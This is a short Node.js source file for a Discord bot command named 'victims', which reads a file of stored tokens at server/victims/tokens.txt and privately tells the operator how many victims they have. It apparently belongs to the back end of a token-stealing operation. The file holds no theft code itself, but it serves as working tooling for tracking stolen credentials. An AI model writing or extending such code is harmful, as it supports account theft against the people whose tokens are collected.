const fs = require('node:fs')
const path = require('node:path')

const {
    SlashCommandBuilder
} = require('discord.js')

module.exports = {
    data: new SlashCommandBuilder()
        .setName('victims')
        .setDescription('Returns the total number of victims you have.'),
    async execute(interaction) {
        try {
            const victims = (await fs.promises.readFile(path.join('server', 'victims', 'tokens.txt'), 'utf-8')).trim().split('\n')
            await interaction.reply({
                content: `You have a total of ${victims.length} victims.`,
                ephemeral: true
            })
        } catch (e) {
            console.log(e)
            await interaction.reply({
                content: `An error occurred while trying to get the total number of victims.`,
                ephemeral: true
            })
        }
    },
};